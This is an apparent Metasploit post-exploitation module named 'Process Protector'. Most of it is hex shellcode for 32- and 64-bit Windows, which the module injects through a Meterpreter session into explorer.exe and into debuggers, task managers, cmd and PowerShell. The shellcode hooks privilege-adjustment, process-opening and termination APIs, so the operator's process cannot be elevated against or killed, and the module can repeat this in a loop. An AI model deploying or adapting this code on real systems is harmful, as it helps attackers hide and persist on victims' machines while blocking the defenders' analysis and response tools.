##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Process

  def initialize(info = {})
    super(update_info(info,
        'Name'          => 'Process Protector',
        'Description'   => %q{
          This module will protect the given process with injecting special shellcodes and disabling key API functions using inline hooking.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Ege BalcÄ±' ],
        'Platform'      => [ 'win'],
        'SessionTypes'  => [ 'meterpreter']
    ))
        
    register_options([
      OptString.new('PID', [false, 'The target process ID for the UAC elevation.' ]),
      OptBool.new('LOOP', [false, 'Continiously check running processes for elevation prevention.' ]),
    ])

  end

  def run
    # Make sure we meet the requirements before running the script, note no need to return
    # unless error
    return 0 if session.type != "meterpreter"

    if datastore['PID'].to_s == ''
      pid = client.sys.process.getpid.to_i
    else
      pid = datastore['PID'].to_i
    end

    unless has_pid?(pid.to_i)
      print_error('There is no process with given PID.')
      return
    end

    # https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm
    block_api_32 = ""
    block_api_32 << "\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c"
    block_api_32 << "\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    block_api_32 << "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
    block_api_32 << "\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c"
    block_api_32 << "\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
    block_api_32 << "\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    block_api_32 << "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
    block_api_32 << "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01"
    block_api_32 << "\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04"
    block_api_32 << "\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
    block_api_32 << "\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d"
    
    # https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm
    block_api_64 = ""
    block_api_64 << "\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48"
    block_api_64 << "\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48"
    block_api_64 << "\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48"
    block_api_64 << "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9"
    block_api_64 << "\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    block_api_64 << "\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b"
    block_api_64 << "\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
    block_api_64 << "\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    block_api_64 << "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34"
    block_api_64 << "\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
    block_api_64 << "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03"
    block_api_64 << "\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40"
    block_api_64 << "\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40"
    block_api_64 << "\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
    block_api_64 << "\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    block_api_64 << "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a"
    block_api_64 << "\x48\x8b\x12\xe9\x4f\xff\xff\xff"

    # https://github.com/EgeBalci/SelfDefense/blob/master/x86/PreventElevation/prevent_elevation.asm
    prevent_elevate_32 = ""
    prevent_elevate_32 << "\xfc\xe8\xb6\x00\x00\x00\x5b\xe8\x2f\x00\x00\x00"
    prevent_elevate_32 << "\x89\xc6\x68\x10\xe1\x8a\xc3\xe8\x23\x00\x00\x00"
    prevent_elevate_32 << "\x6a\x00\x54\x6a\x40\x6a\x03\x56\xff\xd0\x58\xe8"
    prevent_elevate_32 << "\x03\x00\x00\x00\x32\xc0\xc3\x5a\xb9\x03\x00\x00"
    prevent_elevate_32 << "\x00\x8a\x02\x88\x06\x42\x46\xe2\xf8\x53\xc3\x60"
    prevent_elevate_32 << "\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b"
    prevent_elevate_32 << "\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac"
    prevent_elevate_32 << "\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
    prevent_elevate_32 << "\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
    prevent_elevate_32 << "\x78\xe3\x47\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b"
    prevent_elevate_32 << "\x49\x18\xe3\x39\x49\x8b\x34\x8b\x01\xd6\x31\xff"
    prevent_elevate_32 << "\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    prevent_elevate_32 << "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3"
    prevent_elevate_32 << "\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b"
    prevent_elevate_32 << "\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51"
    prevent_elevate_32 << "\xc3\x5f\x5f\x5a\x8b\x12\xeb\x8e\x5d\x68\x2d\xf9"
    prevent_elevate_32 << "\x7f\xe5\xff\xd5\x68\x75\x1f\x0a\x33\xff\xd5\xe8"
    prevent_elevate_32 << "\x82\x00\x00\x00"
    prevent_elevate_32 << block_api_32
    prevent_elevate_32 << "\x5d\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd"
    prevent_elevate_32 << "\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05"
    prevent_elevate_32 << "\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

    # https://github.com/EgeBalci/SelfDefense/blob/master/x64/PreventElevation/prevent_elevation.asm
    prevent_elevate_64 = ""
    prevent_elevate_64 << "\xfc\xe8\x16\x01\x00\x00\x5b\xe8\x49\x00\x00\x00"
    prevent_elevate_64 << "\x48\x83\xc4\x20\x48\x89\xc6\x41\xba\x10\xe1\x8a"
    prevent_elevate_64 << "\xc3\xe8\x37\x00\x00\x00\x48\x83\xc4\x20\x6a\x00"
    prevent_elevate_64 << "\x49\x89\xe1\x41\xb8\x40\x00\x00\x00\xba\x04\x00"
    prevent_elevate_64 << "\x00\x00\x48\x89\xf1\xff\xd0\x58\xe8\x04\x00\x00"
    prevent_elevate_64 << "\x00\x48\x31\xc0\xc3\x5a\xb9\x04\x00\x00\x00\x8a"
    prevent_elevate_64 << "\x02\x88\x06\x48\xff\xc6\x48\xff\xc2\xe2\xf4\x53"
    prevent_elevate_64 << "\xc3\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65"
    prevent_elevate_64 << "\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20"
    prevent_elevate_64 << "\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    prevent_elevate_64 << "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1"
    prevent_elevate_64 << "\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b"
    prevent_elevate_64 << "\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
    prevent_elevate_64 << "\x0b\x02\x75\x71\x8b\x80\x88\x00\x00\x00\x48\x85"
    prevent_elevate_64 << "\xc0\x74\x66\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b"
    prevent_elevate_64 << "\x40\x20\x49\x01\xd0\xe3\x55\x48\xff\xc9\x41\x8b"
    prevent_elevate_64 << "\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac"
    prevent_elevate_64 << "\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c"
    prevent_elevate_64 << "\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b"
    prevent_elevate_64 << "\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
    prevent_elevate_64 << "\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
    prevent_elevate_64 << "\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
    prevent_elevate_64 << "\x5a\x48\x83\xec\x20\x41\x52\xc3\x58\x41\x59\x5a"
    prevent_elevate_64 << "\x48\x8b\x12\xe9\x50\xff\xff\xff\x5d\x41\xba\x2d"
    prevent_elevate_64 << "\xf9\x7f\xe5\xff\xd5\x41\xba\x75\x1f\x0a\x33\xff"
    prevent_elevate_64 << "\xd5\xe8\xc8\x00\x00\x00"
    prevent_elevate_64 << block_api_64
    prevent_elevate_64 << "\x5d\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95"
    prevent_elevate_64 << "\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a"
    prevent_elevate_64 << "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
    prevent_elevate_64 << "\x59\x41\x89\xda\xff\xd5"

    # https://github.com/EgeBalci/SelfDefense/blob/master/x64/self_defense.asm
    self_defense_64 = ""
    self_defense_64 << "\xfc\xe8\xc8\x00\x00\x00"
    self_defense_64 << block_api_64
    self_defense_64 << "\x5d\x41\xba\x49\x47\xc6\x62\xff\xd5\x49"
    self_defense_64 << "\x89\xc0\xba\x00\x00\x00\x00\xb9\xff\x00\x1f\x00"
    self_defense_64 << "\x41\xba\xee\x95\xb6\x50\xff\xd5\x48\x89\xc3\x6a"
    self_defense_64 << "\x00\x48\xb8\x61\x64\x76\x61\x70\x69\x33\x32\x50"
    self_defense_64 << "\x48\x89\xe1\x41\xba\x4c\x77\x26\x07\xff\xd5\x68"
    self_defense_64 << "\x44\x3a\x50\x00\x48\x89\xe1\xba\x01\x00\x00\x00"
    self_defense_64 << "\x6a\x00\x6a\x00\xb8\x18\x00\x00\x00\x50\x4c\x8d"
    self_defense_64 << "\x44\x24\x08\x4c\x89\xc7\x41\xb9\x00\x00\x00\x00"
    self_defense_64 << "\x41\xba\x9a\x63\x6f\xda\x48\x83\xec\x10\xff\xd5"
    self_defense_64 << "\x48\x89\xd9\xba\x04\x00\x00\x00\x48\x8b\x3f\x49"
    self_defense_64 << "\x89\xf8\x41\xba\xdb\xf8\x3a\xd6\xff\xd5\x68\x6c"
    self_defense_64 << "\x6c\x00\x00\x48\xb8\x75\x73\x65\x72\x33\x32\x2e"
    self_defense_64 << "\x64\x50\x48\x89\xe1\x41\xba\x4c\x77\x26\x07\xff"
    self_defense_64 << "\xd5\x41\xba\xae\x0a\x67\x46\xb9\x01\x00\x00\x00"
    self_defense_64 << "\xff\xd5\x6a\x6c\x48\xb8\x6e\x74\x64\x6c\x6c\x2e"
    self_defense_64 << "\x64\x6c\x50\x48\x89\xe1\x41\xba\x4c\x77\x26\x07"
    self_defense_64 << "\xff\xd5\x48\x89\xc1\x6a\x64\x48\xb8\x73\x65\x72"
    self_defense_64 << "\x54\x68\x72\x65\x61\x50\x48\xb8\x52\x74\x6c\x45"
    self_defense_64 << "\x78\x69\x74\x55\x50\x48\x89\xe2\x41\xba\x49\xf7"
    self_defense_64 << "\x02\x78\xff\xd5\x48\x89\xc5\xe8\x00\x00\x00\x00"
    self_defense_64 << "\x58\xb9\xb7\x01\x00\x00\xc6\x00\x00\x48\xff\xc8"
    self_defense_64 << "\xe2\xf8\x6a\x00\xff\xd5"
    
    # https://github.com/EgeBalci/SelfDefense/blob/master/x86/self_defense.asm
    self_defense_32= ""
    self_defense_32 << "\xfc\xe8\x82\x00\x00\x00"
    self_defense_32 << block_api_32
    self_defense_32 << "\x5d\x68\x49\x47\xc6\x62\xff\xd5"
    self_defense_32 << "\x50\x6a\x00\x68\xff\x0f\x1f\x00\x68\xee\x95\xb6"
    self_defense_32 << "\x50\xff\xd5\x89\xc3\x6a\x00\x68\x70\x69\x33\x32"
    self_defense_32 << "\x68\x61\x64\x76\x61\x54\x68\x4c\x77\x26\x07\xff"
    self_defense_32 << "\xd5\x68\x44\x3a\x50\x00\x83\xec\x04\x6a\x00\x8d"
    self_defense_32 << "\x44\x24\x04\x50\x6a\x01\x8d\x44\x24\x10\x50\x68"
    self_defense_32 << "\x9a\x63\x6f\xda\xff\xd5\x6a\x04\x53\x68\xdb\xf8"
    self_defense_32 << "\x3a\xd6\xff\xd5\x68\x6c\x6c\x00\x00\x68\x33\x32"
    self_defense_32 << "\x2e\x64\x68\x75\x73\x65\x72\x54\x68\x4c\x77\x26"
    self_defense_32 << "\x07\xff\xd5\x6a\x01\x68\xae\x0a\x67\x46\xff\xd5"
    self_defense_32 << "\x6a\x6c\x68\x6c\x2e\x64\x6c\x68\x6e\x74\x64\x6c"
    self_defense_32 << "\x54\x68\x4c\x77\x26\x07\xff\xd5\x6a\x64\x68\x68"
    self_defense_32 << "\x72\x65\x61\x68\x73\x65\x72\x54\x68\x78\x69\x74"
    self_defense_32 << "\x55\x68\x52\x74\x6c\x45\x54\x50\x68\x49\xf7\x02"
    self_defense_32 << "\x78\xff\xd5\x89\xc5\x31\xc0\x64\x8b\x58\x30\x8b"
    self_defense_32 << "\x5b\x0c\x8b\x43\x0c\xc7\x40\x20\xff\xff\xff\x00"
    self_defense_32 << "\xb9\x44\x01\x00\x00\xe8\x00\x00\x00\x00\x58\xc6"
    self_defense_32 << "\x00\x00\x48\xe2\xfa\x6a\x00\xff\xd5"
    
    analysis_tools =['taskmgr.exe','procexp64.exe','ida.exe','ida64.exe','windbg.exe','x32dbg.exe','ollydbg.exe','tasklist.exe','cmd.exe','powershell.exe','cheatengine-x86_x64.exe']

    os = client.sys.config.sysinfo['OS']
    print_status("Target OS -> #{os}")

    client.sys.process.processes.each do |p|
      begin      
        # Check Payload Arch
        if 'explorer.exe' === p['name'].to_s.downcase or analysis_tools.include? p['name'].to_s.downcase
          print_status("Hooking RtlSetDaclSecurityDescriptor on #{p['name']} (#{p['arch']})")
          print_status("Hooking AdjustTokenPrivileges on #{p['name']} (#{p['arch']})")
          if 'x64' === p['arch'].to_s
            execute_shellcode(prevent_elevate_64,nil,p['pid'].to_i)
          else
            execute_shellcode(prevent_elevate_32,nil,p['pid'].to_i)
          end
          print_good("UAC elevation disabled for #{p['name']}")
        end
      rescue => e
        print_error("API hooking failed: #{e}")
      end
    end
    

    if os.to_s.include? "Windows 7" or os.to_s.include? "Windows XP" or os.to_s.include? "2008"
      client.sys.process.processes.each do |p|
        # Check Payload Arch
        if pid.to_i === p['pid'].to_i
          print_status('Injecting self defense shellcode...')
          if 'x64' === p['arch'].to_s
            execute_shellcode(self_defense_64,nil,pid)
          else
            execute_shellcode(self_defense_32,nil,pid)
          end
        end
      end
      print_good('Self defense active !')
    else
      # Set NtOpenProcess & TerminateProcess hashes
      prevent_terminate_64 = prevent_elevate_64.sub! "\x2D\xF9\x7F\xE5", "\x87\xDC\xCA\x5E"
      prevent_terminate_32 = prevent_elevate_32.sub! "\x2D\xF9\x7F\xE5", "\x87\xDC\xCA\x5E"

      prevent_terminate_64 = prevent_elevate_64.sub! "\x75\x1F\x0A\x33", "\xA3\x9D\xA1\x23"
      prevent_terminate_32 = prevent_elevate_32.sub! "\x75\x1F\x0A\x33", "\xA3\x9D\xA1\x23"

      hooked = ""
      while 1
        client.sys.process.processes.each do |p|
          # Check Payload Arch
          if analysis_tools.include? p['name'].to_s.downcase
            print_status("Hooking TerminateProcess on #{p['name']} (#{p['arch']} - #{p['pid']})")
            print_status("Hooking NtOpenProcess on #{p['name']} (#{p['arch']} - #{p['pid']})")
            begin
              if 'x64' === p['arch'].to_s
                execute_shellcode(prevent_terminate_64,nil,p['pid'].to_i)
              else
                execute_shellcode(prevent_terminate_32,nil,p['pid'].to_i)
              end
              hooked << p['pid'].to_s+','
              print_good("Process termination disabled for #{p['name']}")
            rescue => e
              print_error("API hooking failed: #{e}")
            end
          end
        end
        if not datastore['LOOP']
          break
        end           
      end
    end
  end
end
